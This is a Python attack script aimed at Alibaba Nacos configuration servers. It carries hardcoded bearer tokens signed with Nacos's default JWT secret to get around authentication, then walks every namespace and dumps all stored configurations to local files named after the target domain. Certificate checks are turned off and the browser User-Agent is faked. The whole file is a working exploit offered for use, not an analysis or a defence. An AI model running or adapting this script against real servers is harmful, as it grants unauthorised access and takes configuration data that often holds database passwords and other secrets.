# -*- coding:UTF-8 -*-
from urllib.parse import urlparse
import re
import json
import requests
import traceback
headers = {}
# accessToken for request
headers['accessToken'] = ''
# jwt bypass nacos Authentication
headers['Authorization'] = 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5ODg5NDcyN30.feetKmWoPnMkAebjkNnyuKo6c21_hzTgu0dfNqbdpZQ'
# 自签名密钥, 过期时间2099/4/24 20:25:48
#headers['Authorization'] = 'Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6NDA4MDcxNjc0OH0.gBYykaNh0cQc7_MULqGTTrF4dzxGs8oecnXMogkNDa8FQEZgR5yr4MdaoRZddXcNSM2vGt8eSk3ZXOeGAxjsoQ'
# 自签名密钥token
# nacos.core.auth.plugin.nacos.token.secret.key = SecretKey012345678901234567890123456789012345678901234567890987654321
# headers['Authorization'] = 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5ODg5NDcyN30.feetKmWoPnMkAebjkNnyuKo6c21_hzTgu0dfNqbdpZQ'
class Namespace:
    def __init__(self, namespace, namespaceShowName, namespaceDesc, quota, configCount, type):
        self.namespace = namespace
        self.namespaceShowName = namespaceShowName
        self.namespaceDesc = namespaceDesc
        self.quota = quota
        self.configCount = configCount
        self.type = type
class Config:
    def __init__(self, ID, dataID, group, content, MD5, encryptedDataKey, tenant, appName, type):
        self.ID = ID
        self.dataID = dataID
        self.group = group
        self.content = content
        self.MD5 = MD5
        self.encryptedDataKey = encryptedDataKey
        self.tenant = tenant
        self.appName = appName
        self.type = type
print('[*]输入URL to request https://example.com/nacos')
print('[*]参考链接 https://www.ctfiot.com/86921.html')
def check(**kwargs):
    try:
        #if 'nacos' not in kwargs['url']:
        #    kwargs['url'] = kwargs['url'].strip('/')+'/nacos'
        url = kwargs['url']
        data = []
        domain = urlparse(url).netloc.replace(':', '.')+'.txt'
        client = requests.Session()
        client.verify = False
        # 
        # /nacos/v1/console/namespaces
        # 只能读取public空间
        # /nacos/v1/cs/configs?search=accurate&dataId=&group=&appName=&config_tags=&pageNo=1&pageSize=999&tenant=&namespaceId=
        # /nacos/v1/cs/configs?search=blur&dataId=&group=&appName=&config_tags=&pageNo=1&pageSize=999&tenant=&namespaceId=
        # 功能1
        if 'accurate' in url or 'blur' in url:
            # 直接读取最大size999
            url = re.sub(r'pageSize=\d+', r'pageSize=999', url)
            response = client.get(url, headers={"User-Agent":"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)"})
            response.raise_for_status()
            configResult = json.loads(response.text)['pageItems']
            with open('./result/'+domain, 'w') as file:
                file.write('==========================================================\n')
                for config in configResult:
                    content = config['content']
                    content = content.replace("\r\n", "\n")
                    file.write(f"DataID: {config['dataId']}\n")
                    file.write(f"Group: {config['group']}\n")
                    file.write(content + '\n')
                    file.write('==========================================================\n')
            print("[+]创建 %s ok"%domain)
            return
        client = requests.Session()
        client.verify = False
        response = client.get(url+'/v1/console/namespaces', headers=headers, timeout=10)
        response.raise_for_status()
        result = json.loads(response.text)
        data = result['data']
        if data:
            with open('./result/'+domain, 'w', encoding='gbk', errors='ignore') as file:
                for item in data:
                    tenant = item['namespace']
                    file.write(f'################### {tenant} ###################\n')
                    #print(f'################### {tenant} ###################')
                    url = f"{kwargs['url']}/v1/cs/configs?dataId=&group=&appName=&config_tags=&pageNo=1&pageSize=999&tenant={tenant}&search=blur"
                    response = client.get(url, headers=headers)
                    response.raise_for_status()
                    configResult = json.loads(response.text)['pageItems']
                    file.write('==========================================================\n')
                    #print('==========================================================')
                    for config in configResult:
                        content = config['content']
                        content = content.replace("\r\n", "\n")
                        file.write(f"DataID: {config['dataId']}\n")
                        #print(f"DataID: {config['dataId']}")
                        file.write(f"Group: {config['group']}\n")
                        #print(f"Group: {config['group']}")
                        #print(content)
                        file.write(content + '\n')
                        #print(content)
                        file.write('==========================================================\n')
                        #print('==========================================================')
            print("[+]创建 %s ok"%domain)
        else:
            print("[-]未找到配置信息 %s"%url)
    except Exception as e:
        print(traceback.format_exc())
        #print(str(e))